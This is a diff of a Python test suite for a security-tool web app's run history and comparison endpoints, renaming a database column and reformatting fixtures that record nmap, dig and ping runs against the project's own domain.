-                "(id, session_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
+                "(id, personal_workspace_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
                 "VALUES (?, ?, ?, 'finding', 'answer found', 'darklab.sh has address 104.21.4.35', 0, ?, ?)",
                 ("finding-search-run-1", session, run_ids[0], "fp-search-run-1", "2026-01-01T00:00:02"),
             )
             conn.execute(
                 "INSERT INTO entity_labels "
-                "(id, session_id, entity_type, entity_id, label, created) "
+                "(id, personal_workspace_id, entity_type, entity_id, label, created) "
                 "VALUES (?, ?, 'run', ?, 'baseline', ?)",
                 ("label-search-run-1", session, run_ids[0], "2026-01-01T00:00:02"),
             )
             conn.execute(
                 "INSERT INTO entity_notes "
-                "(id, session_id, entity_type, entity_id, body, created, updated) "
+                "(id, personal_workspace_id, entity_type, entity_id, body, created, updated) "
                 "VALUES (?, ?, 'run', ?, 'review note', ?, ?)",
                 (
                     "note-search-run-1",
@@ -23379,7 +23966,7 @@ class TestHistoryRoute:
                 ),
             )
             conn.execute(
-                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
+                "INSERT INTO runs (id, personal_workspace_id, command, started, finished, exit_code, output) "
                 "VALUES (?, ?, ?, ?, ?, ?, ?)",
                 (run_ids[1], session, "ping darklab.sh", "2026-01-01T00:00:03", "2026-01-01T00:00:04", 0, "[]"),
             )
@@ -23419,7 +24006,7 @@ class TestHistoryRoute:
         try:
             conn = sqlite3.connect(DB_PATH)
             conn.execute(
-                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_search_text) "
+                "INSERT INTO runs (id, personal_workspace_id, command, started, finished, exit_code, output, output_search_text) "
                 "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                 (
                     run_ids[0],
@@ -23433,7 +24020,7 @@ class TestHistoryRoute:
                 ),
             )
             conn.execute(
-                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, output_search_text) "
+                "INSERT INTO runs (id, personal_workspace_id, command, started, finished, exit_code, output, output_search_text) "
                 "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                 (
                     run_ids[1],
@@ -23465,17 +24052,20 @@ class TestHistoryRoute:
         try:
             conn = sqlite3.connect(DB_PATH)
             conn.execute(
-                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, full_output_available) "
+                "INSERT INTO runs (id, personal_workspace_id, command, started, finished, "
+                "exit_code, output, full_output_available) "
                 "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                 (run_ids[0], session, "nmap -sV darklab.sh", "2026-01-01T00:00:01", "2026-01-01T00:00:02", 0, "[]", 1),
             )
             conn.execute(
-                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, full_output_available) "
+                "INSERT INTO runs (id, personal_workspace_id, command, started, finished, "
+                "exit_code, output, full_output_available) "
                 "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                 (run_ids[1], session, "nmap -Pn darklab.sh", "2026-01-01T00:00:03", "2026-01-01T00:00:04", 0, "[]", 0),
             )
             conn.execute(
-                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output, full_output_available) "
+                "INSERT INTO runs (id, personal_workspace_id, command, started, finished, "
+                "exit_code, output, full_output_available) "
                 "VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                 (run_ids[2], session, "dig darklab.sh A", "2026-01-01T00:00:05", "2026-01-01T00:00:06", 0, "[]", 1),
             )
@@ -23500,12 +24090,12 @@ class TestHistoryRoute:
         try:
             conn = sqlite3.connect(DB_PATH)
             conn.execute(
-                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
+                "INSERT INTO runs (id, personal_workspace_id, command, started, finished, exit_code, output) "
                 "VALUES (?, ?, ?, ?, ?, ?, ?)",
                 (run_ids[0], session, "curl recent ok", recent.isoformat(), (recent + timedelta(seconds=2)).isoformat(), 0, "[]"),
             )
             conn.execute(
-                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
+                "INSERT INTO runs (id, personal_workspace_id, command, started, finished, exit_code, output) "
                 "VALUES (?, ?, ?, ?, ?, ?, ?)",
                 (
                     run_ids[1],
@@ -23518,7 +24108,7 @@ class TestHistoryRoute:
                 ),
             )
             conn.execute(
-                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
+                "INSERT INTO runs (id, personal_workspace_id, command, started, finished, exit_code, output) "
                 "VALUES (?, ?, ?, ?, ?, ?, ?)",
                 (
                     run_ids[2],
@@ -23531,7 +24121,7 @@ class TestHistoryRoute:
                 ),
             )
             conn.execute(
-                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
+                "INSERT INTO runs (id, personal_workspace_id, command, started, finished, exit_code, output) "
                 "VALUES (?, ?, ?, ?, ?, ?, ?)",
                 (
                     run_ids[3],
@@ -23602,26 +24192,31 @@ class TestHistoryRoute:
         client = get_client()
         session = anonymous_session_id(f"session-{uuid.uuid4()}")
         assessment_state = {
-            "batches": [{
-                "batch_id": "abx-monitor",
-                "project_id": "prj-monitor",
-                "assessment_id": "asm-monitor",
-                "status": "running",
-                "progress": {"total": 2, "pending": 1, "running": 1},
-                "active_commands": [{
-                    "display_command": "nmap monitor.example.test",
+            "batches": [
+                {
+                    "batch_id": "abx-monitor",
+                    "project_id": "prj-monitor",
+                    "assessment_id": "asm-monitor",
                     "status": "running",
-                    "run_id": "run-monitor",
-                }],
-            }],
+                    "progress": {"total": 2, "pending": 1, "running": 1},
+                    "active_commands": [
+                        {
+                            "display_command": "nmap monitor.example.test",
+                            "status": "running",
+                            "run_id": "run-monitor",
+                        }
+                    ],
+                }
+            ],
             "truncated": False,
         }
-        with mock.patch(
-            "blueprints.history.active_runs_for_session", return_value=[]
-        ), mock.patch(
-            "blueprints.history.safe_active_assessment_batch_monitor_state",
-            return_value=assessment_state,
-        ) as assessment_mock:
+        with (
+            mock.patch("blueprints.history.active_runs_for_session", return_value=[]),
+            mock.patch(
+                "blueprints.history.safe_active_assessment_batch_monitor_state",
+                return_value=assessment_state,
+            ) as assessment_mock,
+        ):
             resp = client.get(
                 "/history/active?include_scheduled=1&include_assessment_batches=1",
                 headers={"X-Session-ID": session, "X-Client-ID": "client-1"},
@@ -23682,7 +24277,7 @@ class TestHistoryRoute:
         try:
             conn = sqlite3.connect(DB_PATH)
             conn.executemany(
-                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, output) "
+                "INSERT INTO runs (id, personal_workspace_id, command, started, finished, exit_code, output) "
                 "VALUES (?, ?, ?, ?, ?, ?, ?)",
                 rows,
             )
@@ -23706,7 +24301,7 @@ class TestHistoryRoute:
             assert data["candidates"][2]["confidence"] == "same_command"
         finally:
             conn = sqlite3.connect(DB_PATH)
-            conn.execute("DELETE FROM runs WHERE session_id = ?", (session,))
+            conn.execute("DELETE FROM runs WHERE personal_workspace_id = ?", (session,))
             conn.commit()
             conn.close()
 
@@ -23733,25 +24328,55 @@ class TestHistoryRoute:
         assert diff["hunks"][1]["right"]["lines"][diff["hunks"][1]["right_unpaired"][0]]["text"] == "extra"
         buckets = run_comparison.density_buckets_for_hunks(diff["hunks"], bucket_count=4)
         assert len(buckets) == 4
-        assert sum(
-            bucket["equal"] + bucket["added"] + bucket["removed"] + bucket["changed"]
-            for bucket in buckets
-        ) == 3
+        assert sum(bucket["equal"] + bucket["added"] + bucket["removed"] + bucket["changed"] for bucket in buckets) == 3
         assert buckets[-1]["end"] == 3
-        assert run_comparison.density_bucket_tone({
-            "equal": 3, "added": 1, "removed": 0, "changed": 1,
-        }) == "changed"
-        assert run_comparison.density_bucket_tone({
-            "equal": 3, "added": 2, "removed": 1, "changed": 0,
-        }) == "added"
-        assert run_comparison.density_bucket_tone({
-            "equal": 3, "added": 2, "removed": 2, "changed": 0,
-        }) == "removed"
+        assert (
+            run_comparison.density_bucket_tone(
+                {
+                    "equal": 3,
+                    "added": 1,
+                    "removed": 0,
+                    "changed": 1,
+                }
+            )
+            == "changed"
+        )
+        assert (
+            run_comparison.density_bucket_tone(
+                {
+                    "equal": 3,
+                    "added": 2,
+                    "removed": 1,
+                    "changed": 0,
+                }
+            )
+            == "added"
+        )
+        assert (
+            run_comparison.density_bucket_tone(
+                {
+                    "equal": 3,
+                    "added": 2,
+                    "removed": 2,
+                    "changed": 0,
+                }
+            )
+            == "removed"
+        )
         empty_buckets = run_comparison.density_buckets_for_hunks([], bucket_count=4)
         assert len(empty_buckets) == 4
-        assert all(bucket == {
-            "start": 0, "end": 0, "equal": 0, "added": 0, "removed": 0, "changed": 0,
-        } for bucket in empty_buckets)
+        assert all(
+            bucket
+            == {
+                "start": 0,
+                "end": 0,
+                "equal": 0,
+                "added": 0,
+                "removed": 0,
+                "changed": 0,
+            }
+            for bucket in empty_buckets
+        )
 
         long_equal = run_comparison.hunk_line_diff(
             entries(["a", "b", "c", "d", "e", "old"]),
@@ -23792,15 +24417,17 @@ class TestHistoryRoute:
         assert diff["hunks"][1]["right"]["lines"][0]["role"] == "section-header"
 
     def test_compare_full_output_falls_back_to_preview_when_artifact_is_missing(self):
-        events, source, partial = run_comparison.compare_full_output_events({
-            "id": "cmp-missing-artifact",
-            "session_id": "test-session",
-            "output_preview": json.dumps([{"text": "preview fallback", "cls": ""}]),
-            "preview_truncated": False,
-            "full_output_available": True,
-            "full_output_truncated": False,
-            "rel_path": "missing-compare-artifact.txt.gz",
-        })
+        events, source, partial = run_comparison.compare_full_output_events(
+            {
+                "id": "cmp-missing-artifact",
+                "session_id": "test-session",
+                "output_preview": json.dumps([{"text": "preview fallback", "cls": ""}]),
+                "preview_truncated": False,
+                "full_output_available": True,
+                "full_output_truncated": False,
+                "rel_path": "missing-compare-artifact.txt.gz",
+            }
+        )
 
         assert [event.text for event in events] == ["preview fallback"]
         assert source == "preview"
@@ -23820,7 +24447,7 @@ class TestHistoryRoute:
             artifact_path.write_bytes(b"not a gzip transcript")
             conn = sqlite3.connect(DB_PATH)
             conn.executemany(
-                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, "
+                "INSERT INTO runs (id, personal_workspace_id, command, started, finished, exit_code, "
                 "output_preview, output_line_count, full_output_available, full_output_truncated) "
                 "VALUES (?, ?, 'nmap darklab.sh', datetime('now'), datetime('now'), 0, ?, 1, ?, 0)",
                 [
@@ -23856,8 +24483,7 @@ class TestHistoryRoute:
             assert "left preview" in hunk_texts
             assert "right preview" in hunk_texts
             viewed_event = next(
-                call for call in compare_log.call_args_list
-                if call.args and call.args[0] == "RUN_COMPARISON_VIEWED"
+                call for call in compare_log.call_args_list if call.args and call.args[0] == "RUN_COMPARISON_VIEWED"
             ).kwargs["extra"]
             assert viewed_event["left_output_source"] == "preview"
             assert viewed_event["right_output_source"] == "preview"
@@ -23866,7 +24492,7 @@ class TestHistoryRoute:
         finally:
             conn = sqlite3.connect(DB_PATH)
             conn.execute("DELETE FROM run_output_artifacts WHERE run_id = ?", (left_id,))
-            conn.execute("DELETE FROM runs WHERE session_id = ?", (session,))
+            conn.execute("DELETE FROM runs WHERE personal_workspace_id = ?", (session,))
             conn.commit()
             conn.close()
             try:
@@ -23879,15 +24505,19 @@ class TestHistoryRoute:
             {"text": value, "line_index": index} for index, value in enumerate(values)
         ]
         diff = run_comparison.hunk_line_diff(
-            entries([
-                "alpha service open",
-                "beta service open",
-                "left-only value",
-            ]),
-            entries([
-                "alpha service closed",
-                "beta service closed",
-            ]),
+            entries(
+                [
+                    "alpha service open",
+                    "beta service open",
+                    "left-only value",
+                ]
+            ),
+            entries(
+                [
+                    "alpha service closed",
+                    "beta service closed",
+                ]
+            ),
         )
 
         hunk = diff["hunks"][0]
@@ -23897,10 +24527,7 @@ class TestHistoryRoute:
         assert hunk["right_unpaired"] == []
         assert diff["totals"]["changed_line_count"] == 2
         assert diff["totals"]["removed_line_count"] == 1
-        assert any(
-            segment["changed"]
-            for segment in hunk["changed_pairs"][0]["segments"]["left"]
-        )
+        assert any(segment["changed"] for segment in hunk["changed_pairs"][0]["segments"]["left"])
 
     def test_hunk_line_diff_keeps_unrelated_and_long_replace_lines_unpaired(self):
         unrelated = run_comparison.hunk_line_diff(
@@ -24050,23 +24677,25 @@ class TestHistoryRoute:
     def test_compare_history_lines_returns_filtered_output_slices(self):
         client = get_client()
         session = anonymous_session_id("compare-lines-" + uuid.uuid4().hex[:8])
-        output = json.dumps([
-            {"text": "anon@darklab:/ $ nmap darklab.sh", "cls": "prompt-echo"},
-            {"text": "alpha", "cls": "", "line_index": 0},
-            {
-                "text": "rate:  0.10-kpps, 49.90% done,   0:00:09 remaining, found=2",
-                "role": "progress",
-                "noise_kind": "progress",
-                "line_index": 1,
-            },
-            {"text": "beta", "cls": "", "line_index": 2},
-            {"text": "gamma", "cls": "", "line_index": 3},
-            {"text": "[process exited with code 0]", "cls": "exit-ok"},
-        ])
+        output = json.dumps(
+            [
+                {"text": "anon@darklab:/ $ nmap darklab.sh", "cls": "prompt-echo"},
+                {"text": "alpha", "cls": "", "line_index": 0},
+                {
+                    "text": "rate:  0.10-kpps, 49.90% done,   0:00:09 remaining, found=2",
+                    "role": "progress",
+                    "noise_kind": "progress",
+                    "line_index": 1,
+                },
+                {"text": "beta", "cls": "", "line_index": 2},
+                {"text": "gamma", "cls": "", "line_index": 3},
+                {"text": "[process exited with code 0]", "cls": "exit-ok"},
+            ]
+        )
         try:
             conn = sqlite3.connect(DB_PATH)
             conn.executemany(
-                "INSERT INTO runs (id, session_id, command, started, output_preview, output_line_count) "
+                "INSERT INTO runs (id, personal_workspace_id, command, started, output_preview, output_line_count) "
                 "VALUES (?, ?, 'nmap darklab.sh', datetime('now'), ?, 3)",
                 [
                     ("cmp-lines-left", session, output),
@@ -24077,8 +24706,7 @@ class TestHistoryRoute:
             conn.close()
 
             resp = client.get(
-                "/history/compare/lines?left=cmp-lines-left&right=cmp-lines-right"
-                "&side=a&start=1&end=3",
+                "/history/compare/lines?left=cmp-lines-left&right=cmp-lines-right&side=a&start=1&end=3",
                 headers={"X-Session-ID": session},
             )
             data = json.loads(resp.data)
@@ -24101,7 +24729,7 @@ class TestHistoryRoute:
             assert "0.10-kpps" not in json.dumps(compare_data["hunks"])
         finally:
             conn = sqlite3.connect(DB_PATH)
-            conn.execute("DELETE FROM runs WHERE session_id = ?", (session,))
+            conn.execute("DELETE FROM runs WHERE personal_workspace_id = ?", (session,))
             conn.commit()
             conn.close()
 
@@ -24113,7 +24741,7 @@ class TestHistoryRoute:
         try:
             conn = sqlite3.connect(DB_PATH)
             conn.executemany(
-                "INSERT INTO runs (id, session_id, command, started, output_preview, output_line_count) "
+                "INSERT INTO runs (id, personal_workspace_id, command, started, output_preview, output_line_count) "
                 "VALUES (?, ?, 'nmap darklab.sh', datetime('now'), ?, 1)",
                 [
                     ("cmp-lines-invalid-left", session, output),
@@ -24125,23 +24753,19 @@ class TestHistoryRoute:
             conn.close()
 
             invalid_side = client.get(
-                "/history/compare/lines?left=cmp-lines-invalid-left&right=cmp-lines-invalid-right"
-                "&side=x&start=0&end=1",
+                "/history/compare/lines?left=cmp-lines-invalid-left&right=cmp-lines-invalid-right&side=x&start=0&end=1",
                 headers={"X-Session-ID": session},
             )
             out_of_range = client.get(
-                "/history/compare/lines?left=cmp-lines-invalid-left&right=cmp-lines-invalid-right"
-                "&side=a&start=0&end=2",
+                "/history/compare/lines?left=cmp-lines-invalid-left&right=cmp-lines-invalid-right&side=a&start=0&end=2",
                 headers={"X-Session-ID": session},
             )
             stale_start = client.get(
-                "/history/compare/lines?left=cmp-lines-invalid-left&right=cmp-lines-invalid-right"
-                "&side=a&start=2&end=4",
+                "/history/compare/lines?left=cmp-lines-invalid-left&right=cmp-lines-invalid-right&side=a&start=2&end=4",
                 headers={"X-Session-ID": session},
             )
             cross_session = client.get(
-                "/history/compare/lines?left=cmp-lines-invalid-left&right=cmp-lines-invalid-other"
-                "&side=a&start=0&end=1",
+                "/history/compare/lines?left=cmp-lines-invalid-left&right=cmp-lines-invalid-other&side=a&start=0&end=1",
                 headers={"X-Session-ID": session},
             )
 
@@ -24163,22 +24787,24 @@ class TestHistoryRoute:
             assert cross_session.status_code == 404
         finally:
             conn = sqlite3.connect(DB_PATH)
-            conn.execute("DELETE FROM runs WHERE session_id IN (?, ?)", (session, other_session))
+            conn.execute("DELETE FROM runs WHERE personal_workspace_id IN (?, ?)", (session, other_session))
             conn.commit()
             conn.close()
 
     def test_compare_history_lines_paginates_by_line_and_byte_limits(self):
         client = get_client()
         session = anonymous_session_id("compare-lines-limit-" + uuid.uuid4().hex[:8])
-        output = json.dumps([
-            {"text": "aaaa", "cls": "", "line_index": 0},
-            {"text": "bbbb", "cls": "", "line_index": 1},
-            {"text": "cccc", "cls": "", "line_index": 2},
-        ])
+        output = json.dumps(
+            [
+                {"text": "aaaa", "cls": "", "line_index": 0},
+                {"text": "bbbb", "cls": "", "line_index": 1},
+                {"text": "cccc", "cls": "", "line_index": 2},
+            ]
+        )
         try:
             conn = sqlite3.connect(DB_PATH)
             conn.executemany(
-                "INSERT INTO runs (id, session_id, command, started, output_preview, output_line_count) "
+                "INSERT INTO runs (id, personal_workspace_id, command, started, output_preview, output_line_count) "
                 "VALUES (?, ?, 'nmap darklab.sh', datetime('now'), ?, 3)",
                 [
                     ("cmp-lines-limit-left", session, output),
@@ -24190,8 +24816,7 @@ class TestHistoryRoute:
 
             with mock.patch("services.runs.comparison.COMPARE_LAZY_EQUAL_PAGE_LIMIT", 2):
                 line_limited = client.get(
-                    "/history/compare/lines?left=cmp-lines-limit-left&right=cmp-lines-limit-right"
-                    "&side=a&start=0&end=3",
+                    "/history/compare/lines?left=cmp-lines-limit-left&right=cmp-lines-limit-right&side=a&start=0&end=3",
                     headers={"X-Session-ID": session},
                 )
             line_data = json.loads(line_limited.data)
@@ -24203,8 +24828,7 @@ class TestHistoryRoute:
 
             with mock.patch("services.runs.comparison.COMPARE_LAZY_EQUAL_BYTE_LIMIT", 5):
                 byte_limited = client.get(
-                    "/history/compare/lines?left=cmp-lines-limit-left&right=cmp-lines-limit-right"
-                    "&side=a&start=0&end=3",
+                    "/history/compare/lines?left=cmp-lines-limit-left&right=cmp-lines-limit-right&side=a&start=0&end=3",
                     headers={"X-Session-ID": session},
                 )
             byte_data = json.loads(byte_limited.data)
@@ -24216,8 +24840,7 @@ class TestHistoryRoute:
 
             with mock.patch("services.runs.comparison.COMPARE_LAZY_EQUAL_BYTE_LIMIT", 3):
                 oversized_line = client.get(
-                    "/history/compare/lines?left=cmp-lines-limit-left&right=cmp-lines-limit-right"
-                    "&side=a&start=0&end=3",
+                    "/history/compare/lines?left=cmp-lines-limit-left&right=cmp-lines-limit-right&side=a&start=0&end=3",
                     headers={"X-Session-ID": session},
                 )
             oversized_data = json.loads(oversized_line.data)
@@ -24228,83 +24851,99 @@ class TestHistoryRoute:
             assert oversized_data["byte_limit"] == 3
         finally:
             conn = sqlite3.connect(DB_PATH)
-            conn.execute("DELETE FROM runs WHERE session_id = ?", (session,))
+            conn.execute("DELETE FROM runs WHERE personal_workspace_id = ?", (session,))
             conn.commit()
             conn.close()
 
     def test_compare_history_runs_returns_metadata_and_changed_lines(self):
         client = get_client()
         session = anonymous_session_id("compare-runs-" + uuid.uuid4().hex[:8])
-        left_output = json.dumps([
-            {"text": "anon@darklab:/ $ nmap darklab.sh", "cls": "prompt-echo"},
-            {"text": "Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-30 23:22 UTC", "cls": ""},
-            {"text": "80/tcp open http", "cls": "", "signals": ["findings"], "line_index": 0},
-            {"text": "8080/tcp open http-proxy", "cls": "", "signals": ["findings"], "line_index": 1},
-            {"text": "[process exited with code 0]", "cls": "exit-ok"},
-        ])
-        right_output = json.dumps([
-            {"text": "anon@darklab:/ $ nmap darklab.sh", "cls": "prompt-echo"},
-            {"text": "Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-30 23:21 UTC", "cls": ""},
-            {"text": "80/tcp open http", "cls": "", "signals": ["findings"], "line_index": 0},
-            {"text": "443/tcp open https", "cls": "", "signals": ["findings"], "line_index": 1},
-            {"text": "[process exited with code 0]", "cls": "exit-ok"},
-        ])
-        left_web_output = json.dumps([
-            {
-                "text": "https://darklab.sh [200] [Old title]",
-                "cls": "",
-                "signals": ["findings"],
-                "line_index": 0,
-                "entities": [{
-                    "type": "url",
-                    "value": "https://darklab.sh",
-                    "canonical_value": "https://darklab.sh",
-                    "confidence": "medium",
-                }],
-            },
-            {
-                "text": "https://darklab.sh/login [404] [Login]",
-                "cls": "",
-                "signals": ["findings"],
-                "line_index": 1,
-                "entities": [{
-                    "type": "url",
-                    "value": "https://darklab.sh/login",
-                    "canonical_value": "https://darklab.sh/login",
-                    "confidence": "medium",
-                }],
-            },
-        ])
-        right_web_output = json.dumps([
-            {
-                "text": "https://darklab.sh [301] [New title]",
-                "cls": "",
-                "signals": ["findings"],
-                "line_index": 0,
-                "entities": [{
-                    "type": "url",
-                    "value": "https://darklab.sh",
-                    "canonical_value": "https://darklab.sh",
-                    "confidence": "medium",
-                }],
-            },
-            {
-                "text": "https://darklab.sh/admin [200] [Admin]",
-                "cls": "",
-                "signals": ["findings"],
-                "line_index": 1,
-                "entities": [{
-                    "type": "url",
-                    "value": "https://darklab.sh/admin",
-                    "canonical_value": "https://darklab.sh/admin",
-                    "confidence": "medium",
-                }],
-            },
-        ])
+        left_output = json.dumps(
+            [
+                {"text": "anon@darklab:/ $ nmap darklab.sh", "cls": "prompt-echo"},
+                {"text": "Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-30 23:22 UTC", "cls": ""},
+                {"text": "80/tcp open http", "cls": "", "signals": ["findings"], "line_index": 0},
+                {"text": "8080/tcp open http-proxy", "cls": "", "signals": ["findings"], "line_index": 1},
+                {"text": "[process exited with code 0]", "cls": "exit-ok"},
+            ]
+        )
+        right_output = json.dumps(
+            [
+                {"text": "anon@darklab:/ $ nmap darklab.sh", "cls": "prompt-echo"},
+                {"text": "Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-30 23:21 UTC", "cls": ""},
+                {"text": "80/tcp open http", "cls": "", "signals": ["findings"], "line_index": 0},
+                {"text": "443/tcp open https", "cls": "", "signals": ["findings"], "line_index": 1},
+                {"text": "[process exited with code 0]", "cls": "exit-ok"},
+            ]
+        )
+        left_web_output = json.dumps(
+            [
+                {
+                    "text": "https://darklab.sh [200] [Old title]",
+                    "cls": "",
+                    "signals": ["findings"],
+                    "line_index": 0,
+                    "entities": [
+                        {
+                            "type": "url",
+                            "value": "https://darklab.sh",
+                            "canonical_value": "https://darklab.sh",
+                            "confidence": "medium",
+                        }
+                    ],
+                },
+                {
+                    "text": "https://darklab.sh/login [404] [Login]",
+                    "cls": "",
+                    "signals": ["findings"],
+                    "line_index": 1,
+                    "entities": [
+                        {
+                            "type": "url",
+                            "value": "https://darklab.sh/login",
+                            "canonical_value": "https://darklab.sh/login",
+                            "confidence": "medium",
+                        }
+                    ],
+                },
+            ]
+        )
+        right_web_output = json.dumps(
+            [
+                {
+                    "text": "https://darklab.sh [301] [New title]",
+                    "cls": "",
+                    "signals": ["findings"],
+                    "line_index": 0,
+                    "entities": [
+                        {
+                            "type": "url",
+                            "value": "https://darklab.sh",
+                            "canonical_value": "https://darklab.sh",
+                            "confidence": "medium",
+                        }
+                    ],
+                },
+                {
+                    "text": "https://darklab.sh/admin [200] [Admin]",
+                    "cls": "",
+                    "signals": ["findings"],
+                    "line_index": 1,
+                    "entities": [
+                        {
+                            "type": "url",
+                            "value": "https://darklab.sh/admin",
+                            "canonical_value": "https://darklab.sh/admin",
+                            "confidence": "medium",
+                        }
+                    ],
+                },
+            ]
+        )
         try:
             conn = sqlite3.connect(DB_PATH)
             conn.executemany(
-                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, "
+                "INSERT INTO runs (id, personal_workspace_id, command, started, finished, exit_code, "
                 "output_preview, output_line_count) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                 [
                     (
@@ -24351,25 +24990,25 @@ class TestHistoryRoute:
             )
             conn.execute(
                 "INSERT INTO findings "
-                "(id, session_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
+                "(id, personal_workspace_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
                 "VALUES (?, ?, ?, 'finding', 'open port 8080', '8080/tcp open http-proxy', 1, ?, datetime('now'))",
                 ("cmp-finding-left", session, "cmp-left", "cmp-fp-left"),
             )
             conn.execute(
                 "INSERT INTO findings "
-                "(id, session_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
+                "(id, personal_workspace_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
                 "VALUES (?, ?, ?, 'finding', 'open port 443', '443/tcp open https', 1, ?, datetime('now'))",
                 ("cmp-finding-right", session, "cmp-right", "cmp-fp-right"),
             )
             conn.execute(
                 "INSERT INTO run_file_artifacts "
-                "(id, session_id, run_id, workspace_path, display_name, kind, byte_size, detected_by, created) "
+                "(id, personal_workspace_id, run_id, workspace_path, display_name, kind, byte_size, detected_by, created) "
                 "VALUES (?, ?, ?, 'reports/left.txt', 'left.txt', 'output', 10, 'workspace_flag', datetime('now'))",
                 ("cmp-artifact-left", session, "cmp-left"),
             )
             conn.execute(
                 "INSERT INTO run_file_artifacts "
-                "(id, session_id, run_id, workspace_path, display_name, kind, byte_size, detected_by, created) "
+                "(id, personal_workspace_id, run_id, workspace_path, display_name, kind, byte_size, detected_by, created) "
                 "VALUES (?, ?, ?, 'reports/right.txt', 'right.txt', 'output', 12, 'workspace_flag', datetime('now'))",
                 ("cmp-artifact-right", session, "cmp-right"),
             )
@@ -24401,8 +25040,7 @@ class TestHistoryRoute:
             assert data["limits"]["minimap_buckets"] == 256
             assert len(data["density_buckets"]) == 256
             assert sum(
-                bucket["equal"] + bucket["added"] + bucket["removed"] + bucket["changed"]
-                for bucket in data["density_buckets"]
+                bucket["equal"] + bucket["added"] + bucket["removed"] + bucket["changed"] for bucket in data["density_buckets"]
             ) == (
                 data["totals"]["equal_line_count"]
                 + data["totals"]["changed_line_count"]
@@ -24426,12 +25064,8 @@ class TestHistoryRoute:
             assert final_right["text"] == "443/tcp open https"
             hunk_texts = []
             for hunk in data["hunks"]:
-                hunk_texts.extend(
-                    line["text"] for line in hunk.get("left", {}).get("lines", [])
-                )
-                hunk_texts.extend(
-                    line["text"] for line in hunk.get("right", {}).get("lines", [])
-                )
+                hunk_texts.extend(line["text"] for line in hunk.get("left", {}).get("lines", []))
+                hunk_texts.extend(line["text"] for line in hunk.get("right", {}).get("lines", []))
             assert all("process exited" not in text for text in hunk_texts)
             assert [item["raw_line"] for item in data["objects"]["findings"]["added"]] == ["443/tcp open https"]
             assert [item["raw_line"] for item in data["objects"]["findings"]["removed"]] == ["8080/tcp open http-proxy"]
@@ -24460,8 +25094,7 @@ class TestHistoryRoute:
             assert port_group["removed"][0]["compare_line_index"] == 2
             assert port_group["removed"][0]["compare_side"] == "left"
             viewed_call = next(
-                call for call in compare_log.call_args_list
-                if call.args and call.args[0] == "RUN_COMPARISON_VIEWED"
+                call for call in compare_log.call_args_list if call.args and call.args[0] == "RUN_COMPARISON_VIEWED"
             )
             viewed_extra = viewed_call.kwargs["extra"]
             assert viewed_extra == {
@@ -24536,8 +25169,7 @@ class TestHistoryRoute:
             assert capped["truncated"]["artifacts"] == {"left": True, "right": True}
             assert capped["truncated"]["item_limit"] == 0
             capped_event = next(
-                call for call in capped_log.call_args_list
-                if call.args and call.args[0] == "RUN_COMPARISON_VIEWED"
+                call for call in capped_log.call_args_list if call.args and call.args[0] == "RUN_COMPARISON_VIEWED"
             ).kwargs["extra"]
             assert capped_event["findings_truncated"] is True
             assert capped_event["artifacts_truncated"] is True
@@ -24562,23 +25194,25 @@ class TestHistoryRoute:
             assert line_limited["totals"]["removed_line_count"] == 0
         finally:
             conn = sqlite3.connect(DB_PATH)
-            conn.execute("DELETE FROM findings WHERE session_id = ?", (session,))
-            conn.execute("DELETE FROM run_file_artifacts WHERE session_id = ?", (session,))
-            conn.execute("DELETE FROM runs WHERE session_id = ?", (session,))
+            conn.execute("DELETE FROM findings WHERE personal_workspace_id = ?", (session,))
+            conn.execute("DELETE FROM run_file_artifacts WHERE personal_workspace_id = ?", (session,))
+            conn.execute("DELETE FROM runs WHERE personal_workspace_id = ?", (session,))
             conn.commit()
             conn.close()
 
     def test_compare_history_runs_handles_invalid_requests_and_identical_runs(self):
         client = get_client()
         session = anonymous_session_id("compare-errors-" + uuid.uuid4().hex[:8])
-        output = json.dumps([
-            {"text": "same header", "cls": "", "line_index": 0},
-            {"text": "80/tcp open http", "cls": "", "line_index": 1},
-        ])
+        output = json.dumps(
+            [
+                {"text": "same header", "cls": "", "line_index": 0},
+                {"text": "80/tcp open http", "cls": "", "line_index": 1},
+            ]
+        )
         try:
             conn = sqlite3.connect(DB_PATH)
             conn.executemany(
-                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, "
+                "INSERT INTO runs (id, personal_workspace_id, command, started, finished, exit_code, "
                 "output_preview, output_line_count) VALUES (?, ?, 'nmap darklab.sh', ?, ?, 0, ?, 2)",
                 [
                     ("cmp-errors-left", session, "2026-01-01T00:00:01", "2026-01-01T00:00:03", output),
@@ -24632,7 +25266,7 @@ class TestHistoryRoute:
             assert identical_payload["truncated"]["changed_lines"] is False
         finally:
             conn = sqlite3.connect(DB_PATH)
-            conn.execute("DELETE FROM runs WHERE session_id = ?", (session,))
+            conn.execute("DELETE FROM runs WHERE personal_workspace_id = ?", (session,))
             conn.commit()
             conn.close()
 
@@ -24642,7 +25276,7 @@ class TestHistoryRoute:
         try:
             conn = sqlite3.connect(DB_PATH)
             conn.executemany(
-                "INSERT INTO runs (id, session_id, command, started, finished, exit_code, "
